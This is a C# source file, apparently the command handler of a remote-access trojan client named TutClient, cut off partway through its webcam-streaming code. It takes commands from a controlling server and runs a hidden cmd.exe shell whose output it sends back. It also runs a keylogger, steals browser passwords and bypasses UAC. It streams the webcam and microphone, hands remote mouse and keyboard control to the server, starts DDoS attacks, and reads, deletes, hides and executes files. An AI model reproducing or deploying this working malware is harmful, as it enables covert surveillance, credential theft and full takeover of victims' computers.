using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Sockets;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

using AForge.Video;
using AForge.Video.DirectShow;

using BrowserPass;

using NAudio.Wave;

using TutClient.Controls;
using TutClient.Enum;
using TutClient.Helpers;
using TutClient.Params;
using TutClient.Utilities;

namespace TutClient.Handlers
{
    public interface ICommandHandler
    {
        void SendCommand(string response);
    }

    public class CommandHandler : ICommandHandler
    {
        private readonly IConnectionHandler _connectionHandler;
        private readonly IEncoderUtil _encoderUtil;
        private readonly IEncryptionHelper _encryptionHelper;
        private readonly IInformationResolverUtil _informationResolverUtil;
        private readonly IReportHelper _reportHelper;
        private readonly IIpcClientHandler _ipcClientHandler;
        private readonly IDownloadUpload _downloadUpload;
        private readonly IKeylogger _keyLogger;
        private readonly IRDesktop _remoteDesktop;

        public CommandHandler(
            IConnectionHandler connectionHandler, 
            IEncoderUtil encoderUtil, 
            IEncryptionHelper encryptionHelper,
            IInformationResolverUtil informationResolverUtil,
            IReportHelper reportHelper,
            IIpcClientHandler ipcClientHandler,
            IDownloadUpload downloadUpload,
            IKeylogger keyLogger,
            IRDesktop remoteDesktop)
        {
            _connectionHandler = connectionHandler;
            _encoderUtil = encoderUtil;
            _encryptionHelper = encryptionHelper;
            _informationResolverUtil = informationResolverUtil;
            _reportHelper = reportHelper;
            _ipcClientHandler = ipcClientHandler;
            _downloadUpload = downloadUpload;
            _keyLogger = keyLogger;
            _remoteDesktop = remoteDesktop;

            _connectionHandler.SendCommand += OnCommandReceived;
            _connectionHandler.HandleCommand += OnCommandHandled;
            _ipcClientHandler.SendCommand += OnCommandReceived;
            _downloadUpload.SendCommand += OnCommandReceived;
        }

        private void OnCommandReceived(object sender, string command)
        {
            this.SendCommand(command);
        }

        private void OnCommandHandled(object sender, string command)
        {
            this.HandleCommand(command);
        }

        public void SendCommand(string response)
        {
            if(_connectionHandler.IsConnected())
            {
                response = ApplicationSettings.IsLinuxServer
                    ? SslFormatCommand(response)
                    : _encryptionHelper.Encrypt(response);

                var data = _encoderUtil.GetBytes(response); //Get the bytes of the encrypted data

                try
                {
                    if(!ApplicationSettings.IsLinuxServer)
                    {
                        _connectionHandler.Send(data); //Send the data to the server
                    }
                    else
                    {
                        _connectionHandler.WriteToSslClient(data);
                    }
                }
                catch(Exception ex) //Failed to send data to the server
                {
                    Console.WriteLine("Send Command Failure " + ex.Message);
                }
            }
        }

        private string SslFormatCommand(string command)
        {
            // TODO: is this needed? (slash doubling)
            command = command.Replace("\\", "\\\\");
            
            // Get the length of the command in utf8 bytes
            string cmdLength = _encoderUtil.GetPythonLength(command).ToString();
            
            // Splitting pattern
            const string PATTERN = "!??!%";

            // Return the formatted command
            return $"{cmdLength}{PATTERN}{command}";
        }

        private void HandleCommand(string text)
        {
            switch(text.ToLower())
            {
                case "tskmgr":
                    this.StartTaskManager();
                    break;
                case var msg when msg.Contains("fps"):
                    this.SetFPS(msg);
                    break;
                case var msg when msg.StartsWith("getinfo-"):
                    this.GetPcInfo(msg);
                    break;
                case var msg when msg.StartsWith("msg"):
                    this.CreateMessage(msg.Split('|'));
                    break;
                case var msg when msg.StartsWith("freq-"):
                    this.GenerateFreq(msg);
                    break;
                case var msg when msg.StartsWith("sound-"):
                    var snd = text.Substring(6); //Get the ID of the sound
                    this.PlaySystemSound(snd);
                    break;
                case var msg when msg.StartsWith("t2s-"):
                    var txt = text.Substring(4);
                    this.T2S(txt);
                    break;
                case var msg when msg.StartsWith("cd|"):
                    this.ManipulateCdTray(msg);
                    break;
                case var msg when msg.StartsWith("emt|"):
                    this.ShowHideElement(msg);
                    break;
                case "proclist":
                    this.ShowListOfAllProcess();
                    break;
                case var msg when msg.StartsWith("prockill"):
                    this.KillProcess(msg);
                    break;
                case var msg when msg.StartsWith("procstart"):
                    this.StartProcess(msg);
                    break;
                case "startcmd":
                    this.StartCmd();
                    break;
                case "stopcmd":
                    this.StopCmd();
                    break;
                case var msg when msg.StartsWith("cmd§"):
                    var command = text.Substring(4);
                    _toShell?.WriteLine(command + "\r\n");
                    break;
                case "fdrive":
                    this.GetPcDrives();
                    break;
                case var msg when msg.StartsWith("fdir§"):
                    this.ListFilesFromFolder(msg);
                    break;
                case var msg when msg.StartsWith("f1§"):
                    this.MoveDirectoryUp(msg);
                    break;
                case var msg when msg.StartsWith("fpaste§"):
                    this.PasteFileInDirectory(msg);
                    break;
                case var msg when msg.StartsWith("fexec§"):
                    this.ExecuteFile(msg);
                    break;
                case var msg when msg.StartsWith("fhide§"):
                    this.FileVisibility(msg, true);
                    break;
                case var msg when msg.StartsWith("fshow§"):
                    this.FileVisibility(msg, false);
                    break;
                case var msg when msg.StartsWith("fdel§"):
                    this.DeleteFile(msg);
                    break;
                case var msg when msg.StartsWith("frename§"):
                    this.RenameFile(msg);
                    break;
                case var msg when msg.StartsWith("frename§"):
                    this.CreateFile(msg);
                    break;
                case var msg when msg.StartsWith("fndir§"):
                    this.CreateFolder(msg);
                    break;
                case var msg when msg.StartsWith("getfile§"):
                    this.GetFileContent(msg);
                    break;
                case var msg when msg.StartsWith("putfile§"):
                    this.WriteFileContent(msg);
                    break;
                case var msg when msg.StartsWith("fup"):
                    _downloadUpload.UploadFile(msg);
                    break;
                case var msg when msg.StartsWith("fdl§"):
                    _downloadUpload.DownloadFile(msg);
                    break;
                case "fconfirm":
                    _downloadUpload.FileReceivedConfirmationOnServer();
                    break;
                case "dc":
                    _connectionHandler.DisconnectFromServer();
                    break;
                case "sklog":
                    _keyLogger.StartLogger();
                    break;
                case "stklog":
                    _keyLogger.StopLogger();
                    break;
                case "rklog":
                    string dump = _keyLogger.ReadBuffer();
                    SendCommand("putklog" + dump);
                    break;
                case "cklog":
                    _keyLogger.Clear();
                    break;
                case "rdstart":
                    _remoteDesktop.Start();
                    break;
                case "rdstop":
                    _remoteDesktop.Stop();
                    break;
                case var msg when msg.StartsWith("rmove-"):
                    this.MoveMouse(msg);
                    break;
                case var msg when msg.StartsWith("rtype-"):
                    this.KeyboardType(msg);
                    break;
                case var msg when msg.StartsWith("rclick-"):
                    this.MouseClick(msg);
                    break;
                case "alist":
                    this.ListAudioDevices();
                    break;
                case var msg when msg.StartsWith("astream"):
                    this.StreamAudio(msg);
                    break;
                case "astop":
                    this.StopAudioStream();
                    break;
                case "wlist":
                    this.ListCameraDevices();
                    break;
                case var msg when msg.StartsWith("wstream"):
                    this.StreamCamera(msg);
                    break;
                case "wstop":
                    this.StopCameraStream();
                    break;
                case var msg when msg.StartsWith("ddosr"):
                    this.StartDDoS(msg);
                    break;
                case "ddosk":
                    this.StopDDoS();
                    break;
                case "getpw":
                    this.GetBrowserPasswords();
                    break;
                case "getstart":
                    SendCommand("setstart§" + Application.StartupPath); //Send it to the server
                    break;

                case "uacload":
#if EnableAutoBypass
                    var uac = new UAC(); //Create a new UAC module
                    foreach (int progress in uac.AutoLoadBypass()) //Update the progress of the download
                    {
                        SendCommand("uacload§" + progress.ToString()); //Send the progress to the server
                    }
#endif
                    break;
                case "uacbypass":
                    this.ByPassUAC();
                    break;
                case var msg when msg.StartsWith("writeipc§"):
                    this.WriteToProcess(msg);
                    break;
                case var msg when msg.StartsWith("startipc§"):
                    this.StartNewIpcConnection(msg);
                    break;
                case var msg when msg.StartsWith("stopipc§"):
                    _ipcClientHandler.StopIpcHandler();
                    break;
                case "countScreens":
                    this.GetAvailableScreens();
                    break;
                case var msg when msg.StartsWith("screenNum"):
                    var screenNumber = int.Parse(text.Substring(9)) - 1; // because the screens start at 0 not 1 
                    _remoteDesktop.SetActiveScreen(screenNumber);
                    break;
                case var msg when msg.StartsWith("sprobe§"):
                    this.SetStartupProbeOptions(msg);
                    break;
                default:
                    _reportHelper.ReportError(ErrorType.COMMAND_NOT_FOUND, "[COMMAND]", $"Command {text} not found");
                    break;
            }
        }

        private void StartTaskManager()
        {
            var p = new Process
                    {
                        StartInfo = { FileName = "Taskmgr.exe", CreateNoWindow = true }
                    };

            p.Start();
        }

        private void SetFPS(string text)
        {
            switch(text.ToLower())
            {
                case "fpslow":
                    ApplicationSettings.FPS = 150;
                    break;
                case "fpsbest":
                    ApplicationSettings.FPS = 80;
                    break;
                case "fpshigh":
                    ApplicationSettings.FPS = 50;
                    break;
                case "fpsmid":
                    ApplicationSettings.FPS = 100;
                    break;
                default:
                    ApplicationSettings.FPS = 100;
                    break;
            }
        }

        private void GetPcInfo(string text)
        {
            string myid = text.Substring(8); //get the client id
            StringBuilder command = new StringBuilder();
            command.Append("infoback;")
                   .Append(myid).Append(";")
                   .Append(Environment.MachineName).Append("|")
                   .Append(_informationResolverUtil.GetLocalIpAddress()).Append("|")
                   .Append(DateTime.Now.ToString()).Append("|")
                   .Append(_informationResolverUtil.AvName());
            SendCommand(command.ToString()); //Send the response to the server
        }

        private void CreateMessage(string[] info)
        {
            var title = info[1]; //Get the title
            var text = info[2]; //Get the prompt text
            var icon = info[3]; //Get the icon
            var button = info[4]; //Get the buttons
            MessageBoxIcon ico; //= MessageBoxIcon.None;
            MessageBoxButtons btn;// = MessageBoxButtons.OK;

            //Parse the icon and buttons data
            switch (icon)
            {
                case "1":
                    ico = MessageBoxIcon.Error;
                    break;

                case "2":
                    ico = MessageBoxIcon.Warning;
                    break;

                case "3":
                    ico = MessageBoxIcon.Information;
                    break;

                case "4":
                    ico = MessageBoxIcon.Question;
                    break;

                default:
                    ico = MessageBoxIcon.None;
                    break;
            }

            switch (button)
            {
                case "1":
                    btn = MessageBoxButtons.YesNo;
                    break;

                case "2":
                    btn = MessageBoxButtons.YesNoCancel;
                    break;

                case "3":
                    btn = MessageBoxButtons.AbortRetryIgnore;
                    break;

                case "4":
                    btn = MessageBoxButtons.OKCancel;
                    break;
                default:
                    btn = MessageBoxButtons.OK;
                    break;
            }

            Task.Run(() => MessageBox.Show(text, title, btn, ico));
        }

        private void GenerateFreq(string text)
        {
            var freq = int.Parse(text.Substring(5));
            var duration = 2000;
            
            Console.Beep(freq, duration); //Play the frequency
        }

        private void PlaySystemSound(string snd)
        {
            SystemSound sound; //Create a sound var

            //Parse the ID to actual sound object
            switch (snd)
            {
                case "0":
                    sound = SystemSounds.Beep;
                    break;

                case "1":
                    sound = SystemSounds.Hand;
                    break;

                case "2":
                    sound = SystemSounds.Exclamation;
                    break;

                default:
                    sound = SystemSounds.Asterisk;
                    break;
            }

            sound.Play(); //Play the system sound
        }

        private void T2S(string sText)
        {
            using (var speech = new SpeechSynthesizer()) //Create a new text reader
            {
                speech.SetOutputToDefaultAudioDevice(); //Set the output device
                speech.Speak(sText); //Read the text
            }
        }

        private void ManipulateCdTray(string text)
        {
            var opt = text.Substring(4);

            if (opt == "open")
            {
                Program.mciSendStringA("set CDAudio door open", "", 127, 0);
            }
            else
            {
                Program.mciSendStringA("set CDAudio door closed", "", 127, 0);
            }
        }

        private void ShowHideElement(string text)
        {
            const int SW_HIDE = 0;
            const int SW_SHOW = 1;
            
            var data = text.Split('|');
            var action = data[1]; //Hide/Show
            var element = data[2]; //The element to manipulate
            var command = action == "hide" ? SW_HIDE : SW_SHOW;
            var hwnd = 0;

            switch (element)
            {
                case "task":
                    Program.ShowWindow(Program.FindWindow("Shell_TrayWnd", null), command);
                    break;
                case "clock":
                    Program.ShowWindow(Program.FindWindowEx(
                            Program.FindWindowEx(Program.FindWindow("Shell_TrayWnd", null),
                                hwnd,
                                "TrayNotifyWnd",
                                null),
                            hwnd,
                            "TrayClockWClass",
                            null),
                        command);
                    break;
                case "tray":
                    Program.ShowWindow(Program.FindWindowEx(Program.FindWindow("Shell_TrayWnd", null),
                            hwnd,
                            "TrayNotifyWnd",
                            null),
                        command);
                    break; 
                case "desktop":
                    Program.ShowWindow(Program.FindWindow(null, "Program Manager"), command);
                    break;

                case "start":
                    Program.ShowWindow(Program.FindWindow("Button", null), command);
                    break;
            }
        }

        private void ShowListOfAllProcess()
        {
            var allProcess = Process.GetProcesses(); //Get the list of running processes
            var response = new StringBuilder();

            foreach (var proc in allProcess) //Go through the processes
            {
                response.Append("setproc|")
                        .Append(proc.ProcessName).Append("|") //Get the name of the process
                        .Append(proc.Responding).Append("|") // Get if the process is responding
                        .Append(proc.MainWindowTitle == "" ? "N/A" : proc.MainWindowTitle).Append("|"); // Get the main window's title

                var priority = "N/A";
                var path = "N/A";

                try
                {
                    priority = proc.PriorityClass.ToString(); //Get process priority
                    path = proc.Modules[0].FileName; //Get process executable path
                }
                catch(Exception) // 32-bit can't get 64-bit processes path / non-admin rights catch
                {
                    // ignored
                }

                response.Append(priority).Append("|")
                        .Append(path).Append("|")
                        .Append(proc.Id).Append("\n"); //Get the ID of the process
            }

            SendCommand(response.ToString()); //Send the response to the server
        }

        private void KillProcess(string text)
        {
            int id = int.Parse(text.Substring(9)); //Get the ID of the process ot kill
            try
            {
                Process.GetProcessById(id).Kill(); //Try to kill the process
            }
            catch (Exception ex) //Failed to kill it
            {
                _reportHelper.ReportError(ErrorType.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + id); //Report to the server
            }
        }

        private void StartProcess(string text)
        {
            try
            {
                var data = text.Split('|');
                var p = new Process {StartInfo = {FileName = data[1]}}; 

                if (data[2] == "hidden")
                {
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                } 
                
                p.Start();
            }
            catch (Exception ex)
            {
                _reportHelper.ReportError(ErrorType.EXCEPTION, "[StartProcess]", ex.Message);
            }
        }

        private Process _cmdProcess;
        private StreamWriter _toShell;
        private StreamReader _fromShell;

        private void StartCmd()
        {
            var info = new ProcessStartInfo
                       {
                           FileName = "cmd.exe", //Set the file to cmd
                           CreateNoWindow = true, //Don't draw a window for it
                           UseShellExecute = false, //Don't use shell execution (needed to redirect the stdout, stdin and stderr)
                           RedirectStandardInput = true, //Redirect stdin
                           RedirectStandardOutput = true, //Redirect stdout
                           RedirectStandardError = true //Redirect stderr
                       }; //Create a new startinfo object


            _cmdProcess = new Process { StartInfo = info };
            _cmdProcess.Start();
            _toShell = _cmdProcess.StandardInput; //Get the stdin
            _toShell.AutoFlush = true; //Enable auto flushing

            _fromShell = _cmdProcess.StandardOutput; //Get the stdout
            var error = _cmdProcess.StandardError; //Get the stderr
            
            // Get stdout and stderr from the shell
            GetShellOutput(_fromShell, error);
        }

        private void GetShellOutput(StreamReader fromShell, StreamReader error)
        {
            Task.Factory.StartNew(() =>
            {
                try
                {
                    var outputBuffer = "";
                    while ((outputBuffer = fromShell.ReadLine()) != null)
                    {
                        SendCommand("cmdout§" + outputBuffer);
                    }
                }
                catch (Exception ex)
                {
                    SendCommand("cmdout§Error reading cmd response: \n" + ex.Message); //Send message to remote cmd window
                    _reportHelper.ReportError(ErrorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!"); //Report error to the server
                }
            });

            Task.Factory.StartNew(() =>
            {
                try
                {
                    var errorBuffer = "";
                    while ((errorBuffer = error.ReadLine()) != null)
                    {
                        SendCommand("cmdout§" + errorBuffer);
                    }
                }
                catch (Exception ex)
                {
                    SendCommand("cmdout§Error reading cmd response: \n" + ex.Message); //Send message to remote cmd window
                    _reportHelper.ReportError(ErrorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!"); //Report error to the server
                }
            });

        }

        private void StopCmd()
        {
            _cmdProcess?.Kill();
            _cmdProcess?.Dispose();
            _cmdProcess = null;

            _toShell?.Dispose();
            _toShell = null;

            _fromShell?.Dispose();
            _fromShell = null;
        }

        private void GetPcDrives()
        {
            var drives = DriveInfo.GetDrives(); //Get the drives on the machine

            var response = new StringBuilder();
            response.Append("fdrivel§");

            foreach (var d in drives) //Go thorugh the drives
            {
                if (d.IsReady) //Drive is ready (browsable)
                {
                    // Get the name and size of the drive
                    response.Append(d.Name).Append("|")
                            .Append(d.TotalSize.ToString()).Append("\n");
                }
                else //Drive is not ready
                {
                    // Get the name of the drive
                    response.Append(d.Name).Append("\n");
                }
            }

            SendCommand(response.ToString()); //Respond to the server
        }

        private void ListFilesFromFolder(string text)
        {
            var path = text.Substring(5); //The directory to list

            // Path is a file or invalid path
            if (path.Length == 3 && !path.EndsWith(":\\") || !Directory.Exists(path))
            {
                _reportHelper.ReportError(ErrorType.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + path); //Report error to server
                return;
            }

            var resp = GetFilesList(path); // Get the response to the command
            SendCommand(resp); //Send the response to the server
        }

        private string GetFilesList(string path)
        {
            var directories = Directory.GetDirectories(path); //Get the sub folders
            var files = Directory.GetFiles(path); //Get the sub files
            var listing = new StringBuilder(); // Create string builder for response
            listing.Append("fdirl");

            for (var i = 0; i < directories.Length; i++)
            {
                var d = directories[i]; // Get the current directory
                listing.Append(d.Replace(path, string.Empty)).Append("§") // Get the name of the directory
                       .Append("N/A").Append("§") // Get the size of the directory
                       .Append(Directory.GetCreationTime(d).ToString()).Append("§") // Get the creation time of the directory
                       .Append(d).Append("\n"); // Get the full path of the directory
            }

            for (var i = 0; i < files.Length; i++)
            {
                var f = files[i]; // Get the current file
                var finfo = new FileInfo(f); // Get the info of the current file
                listing.Append(finfo.Name).Append("§") // Get the name of the file
                       .Append(finfo.Length.ToString()).Append("§") // Get the size of the file in bytes
                       .Append(finfo.CreationTime.ToString()).Append("§") // Get the creation time of the file
                       .Append(f).Append("\n"); // Get the full path of the file
            }

            return listing.ToString();
        }

        private void MoveDirectoryUp(string text)
        {
            var current = text.Substring(3);
            if (current.Length == 3 && current.Contains(":\\"))
            {
                SendCommand("f1§drive");
            }
            else
            {
                var parent = new DirectoryInfo(current).Parent?.FullName;
                SendCommand("f1§" + parent);
            }
        }

        private void PasteFileInDirectory(string text)
        {
            var data = text.Split('§');
            var source = data[2]; //Source path of the file
            var target = data[1]; //Destionation of the file
            var mode = data[3]; //The mode (copy/move)
            var sourceType = "file"; //The source type (dir/file)

            if (!Directory.Exists(target)) //Destination isn't a directory
            {
                _reportHelper.ReportError(ErrorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager"); //Report to server
                return;
            }

            if (Directory.Exists(source))
            {
                sourceType = "dir";
            }

            PasteFileOrDir(source, target, mode, sourceType); // Paste the directory or file
        }

        private void PasteFileOrDir(string source, string target, string mode, string sourceType)
        {
            switch (sourceType) //Check the sourceType
            {
                case "dir": //Source is a folder
                    if (mode == "1")
                    {
                        //Copy Directory
                        string name = new DirectoryInfo(source).Name;
                        Directory.CreateDirectory(target + "\\" + name);
                        DirectoryCopy(source, target + "\\" + name, true);
                    }
                    else if (mode == "2")
                    {
                        //Move Directory
                        var name = new DirectoryInfo(source).Name;
                        Directory.CreateDirectory(target + "\\" + name);
                        DirectoryMove(source, target + "\\" + name, true);
                    }
                    break;
                case "file": //Source is a file
                    if (mode == "1")
                    {
                        //Copy File
                        File.Copy(source, target + "\\" + new FileInfo(source).Name, true);
                    }
                    else if (mode == "2")
                    {
                        //Move File
                        File.Move(source, target + "\\" + new FileInfo(source).Name);
                    }
                    break;
            }
        }

        private void DirectoryMove(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            var dir = new DirectoryInfo(sourceDirName);
            var dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            var files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                var temppath = Path.Combine(destDirName, file.Name);
                file.MoveTo(temppath);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (var subdir in dirs)
                {
                    var tempPath = Path.Combine(destDirName, subdir.Name);
                    DirectoryMove(subdir.FullName, tempPath, copySubDirs);
                }
            }
        }

        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            var dir = new DirectoryInfo(sourceDirName);
            var dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            var files = dir.GetFiles();
            foreach (var file in files)
            {
                var tempPath = Path.Combine(destDirName, file.Name);
                file.CopyTo(tempPath, false);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (var subDir in dirs)
                {
                    var tempPath = Path.Combine(destDirName, subDir.Name);
                    DirectoryCopy(subDir.FullName, tempPath, copySubDirs);
                }
            }
        }

        private void ExecuteFile(string text)
        {
            var path = text.Substring(6); //The path to execute
            if (!File.Exists(path) && !Directory.Exists(path)) //Invalid path
            {
                _reportHelper.ReportError(ErrorType.FILE_NOT_FOUND, "Can't execute " + path, "File cannot be located by manager"); //Report to server
                return;
            }

            Process.Start(path); //Execute the file
        }

        private void FileVisibility(string text, bool hide)
        {
            var attribute = hide ? FileAttributes.Hidden : FileAttributes.Normal;

            var path = text.Substring(6); //The file to hide
            if (!File.Exists(path) && !Directory.Exists(path)) //Invalid path
            {
               _reportHelper.ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path); //Report to the server
                return;
            }
            File.SetAttributes(path, attribute);

        }

        private void DeleteFile(string text)
        {
            var path = text.Substring(5); //Get the path of the file
            if (Directory.Exists(path)) //Path is a folder
            {
                Directory.Delete(path, true); //Remove the folder recursive
            }
            else if (File.Exists(path)) //Path is a file
            {
                File.Delete(path); //Remove the file
            }
            else //Invalid path
            {
               _reportHelper.ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + path); //Report error to the server
            }
        }

        private void RenameFile(string text)
        {
            var data = text.Split('§');
            var path = data[1]; //The path of the file to rename
            var name = data[2]; //The new name of the file
            if (Directory.Exists(path)) //Path is folder
            {
                var target = new DirectoryInfo(path).Parent?.FullName + "\\" + name; //Create the new path of the folder
                Directory.Move(path, target); //Rename the folder
            }
            else //Path is a file
            {
                if (!File.Exists(path)) //Path is a non-existent file
                {
                   _reportHelper.ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + path); //Report the error to the server
                    return;
                }
                var target = new FileInfo(path).Directory?.FullName + "\\" + name;
                File.Move(path, target);
            }
        }

        private void CreateFile(string text)
        {
            var data = text.Split('§');
            var fullPath = data[1] + "\\" + data[2]; //Create the path of the file

            //Overwrite existing
            if (File.Exists(fullPath))
            {
                File.Delete(fullPath);
            }

            File.Create(fullPath).Close(); //Close the open stream, to prevent blocking access to the file
        }

        private void CreateFolder(string text)
        {
            var data = text.Split('§');
            var fullPath = data[1] + "\\" + data[2]; //Create the path of the new folder
            
            //Overwrite existing
            if (Directory.Exists(fullPath))
            {
                Directory.Delete(fullPath, true);
            }

            Directory.CreateDirectory(fullPath); //Create the folder
        }

        private void GetFileContent(string text)
        {
            string path = text.Substring(8); //Get the path of the file
            if (!File.Exists(path)) //Path is not a file
            {
                _reportHelper.ReportError(ErrorType.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + path); //Report error to server
                return;
            }
            var content = File.ReadAllText(path); //Read the file
            var back = "backfile§" + content; //Create the response command
            SendCommand(back); //Send the file contents back to the server
        }

        private void WriteFileContent(string text)
        {
            var path = text.Split('§')[1]; //The path of the file to write
            var content = text.Split('§')[2]; //The content to write to the file

            if (!File.Exists(path)) //Path is not a file
            {
               _reportHelper.ReportError(ErrorType.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + path); //Report error to the server
                return;
            }

            File.WriteAllText(path, content); //Write all content to the file
        }

        private void MoveMouse(string text)
        {
            var t = text.Substring(6); //Get the command parts
            var x = t.Split(':'); //Get the coordinate parts

            Cursor.Position = new Point(int.Parse(x[0]), int.Parse(x[1])); //Set the position of the mouse
        }

        private void MouseClick(string text)
        {
            var t = text.Split('-'); //Get the command parts
            // TODO: rework click algorithm, send byte values by default to bypass conversation overhead
           MouseEvent(t[1], t[2]); //Generate a new mouse event
        }

        private void MouseEvent(string button, string direction)
        {
            //Get the current position of the mouse
            int x = Cursor.Position.X;
            int y = Cursor.Position.Y;
            Cursor.Position = new Point(x, y);

            //Check and handle button press or release
            switch (button)
            {
                case "left":
                    if (direction == "up")
                    {
                        Program.mouse_event((int)(MouseEventFlags.LEFTUP), x, y, 0, 0);
                    }
                    else
                    {
                        Program.mouse_event((int)(MouseEventFlags.LEFTDOWN), x, y, 0, 0);
                    }
                    break;

                case "right":
                    if (direction == "up")
                    {
                        Program.mouse_event((int)(MouseEventFlags.RIGHTUP), x, y, 0, 0);
                    }
                    else
                    {
                        Program.mouse_event((int)(MouseEventFlags.RIGHTDOWN), x, y, 0, 0);
                    }

                    break;
            }
        }

        private void KeyboardType(string text)
        {
            var t = text.Substring(6); //Get the command parts
            if (string.IsNullOrEmpty(t) == false)
            {
                SendKeys.SendWait(t); //Send the key to the OS
                SendKeys.Flush(); //Flush to not store the keys in a buffer
            }
        }

        private void ListAudioDevices()
        {
            var listing = new StringBuilder();
            listing.Append("alist");

            for (var i = 0; i < WaveIn.DeviceCount; i++) //Loop through the devices
            {
                // Get the device info
                var c = WaveIn.GetCapabilities(i);
                
                // Add the device to the listing
                listing.Append(c.ProductName).Append("|")
                       .Append(c.Channels.ToString())
                       .Append("§");
            }

            // Get and format the response
            var resp = listing.ToString();
            if (resp.Length > 0)
            {
                resp = resp.Substring(0, resp.Length - 1);
            }
            
            SendCommand(resp); //Send response to the server
        }

        private WaveInEvent _audioSource;

        private void StreamAudio(string text)
        {
            try
            {
                var deviceNumber = int.Parse(text.Substring(8)); //Convert the number to int
                _audioSource = new WaveInEvent
                               {
                                   DeviceNumber = deviceNumber, //The device ID
                                   WaveFormat = new WaveFormat(44100, WaveIn.GetCapabilities(deviceNumber).Channels) //The format of the wave
                               }; //Create a new wave reader
                _audioSource.DataAvailable += SendAudio; //Attach to new audio event
                _audioSource.StartRecording(); //Start receiving data from mic
            }
            catch (Exception) //Wrong device ID
            {
               _reportHelper.ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Can't stream microphone!", "Selected Device is not available!"); //Report error to the server
            }
        }

        private void SendAudio(object sender, WaveInEventArgs e)
        {
            var rawAudio = e.Buffer; //Get the buffer of the audio
            var send = new byte[rawAudio.Length + 16]; //Create a new buffer to send to the server
            var header = Encoding.Unicode.GetBytes("austream"); //Get the bytes of the header

            // TODO: look into array copy vs block copy
            // https://stackoverflow.com/questions/1389821/array-copy-vs-buffer-blockcopy
            Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
            Buffer.BlockCopy(rawAudio, 0, send, header.Length, rawAudio.Length); //Copy the audio data to the main buffer
            
            _connectionHandler.Send(send, 0, send.Length, SocketFlags.None); //Send audio data to the server
        }

        private void StopAudioStream()
        {
            _audioSource.StopRecording(); //Stop receiving audio from the mic
            _audioSource.DataAvailable -= SendAudio;
            _audioSource.Dispose(); //Dispose the audio input
            _audioSource = null;
        }

        private void ListCameraDevices()
        {
            var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get the video input devices on this machine
            var i = 0; //Count of the devices
            var listing = new StringBuilder();
            listing.Append("wlist"); // Add response header

            foreach (FilterInfo device in devices) //Go through the devices
            {
                // Append the device ID and the name of the device
                listing.Append(i.ToString())
                       .Append("|")
                       .Append(device.Name)
                       .Append("§");
                i++; //Increment the ID
            }

            // Get and format the listing
            var resp = listing.ToString();
            if (resp.Length > 0)
            {
                resp = resp.Substring(0, resp.Length - 1); //remove the split char ('§') from the end
            } 

            SendCommand(resp); //Send response to the server
        }

        private VideoCaptureDevice _cameraSource;

        private void StreamCamera(string text)
        {
            var id = int.Parse(text.Substring(8)); //The ID of the device to stream the image of

            var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get all video input devices
            if (devices.Count == 0) //No devices
            {
                _reportHelper.ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Can't stream webcam!", 
                    "The selected device is not found!"); //Report error to the server
                return;
            }
            
            var i = 0;
            var dName = new FilterInfo(""); //Create a new empty device
            foreach (FilterInfo device in devices) //Loop through the video devices
            {
                if (i == id) //If the IDs match
                {
                    dName = device; //Set the device
                    break;
                }
                i++; //Increment the ID
            }

            _cameraSource = new VideoCaptureDevice(dName.MonikerString); //Get the capture device
            _cameraSource.NewFrame += HandleCameraFrames; //Attach a new image handler
            _cameraSource.Start(); //Start receiving images from the camera
        }

        private void HandleCameraFrames(object sender, NewFrameEventArgs e)
        {
            try
            {
                var cam = (Bitmap)e.Frame.Clone(); //Get the frame of the camera

                var convert = new ImageConverter(); //Create a new image converter
                var camBuffer = (byte[])convert.ConvertTo(cam, typeof(byte[])); //Convert the image to bytes
                var send = new byte[camBuffer.Length + 16]; //Create a new buffer for the command
                var header = _encoderUtil.GetBytes("wcstream"); //Get the bytes of the header
                
                // TODO: look into block copy vs array copy
                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
                Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length); //Copy the image to the main buffer
                
                _connectionHandler.Send(send, 0, send.Length, SocketFlags.None); //Send the frame to the server
                
                Application.DoEvents();
                Thread.Sleep(200);
                cam.Dispose();
            }
            catch (Exception ex) //Something went wrong
            {
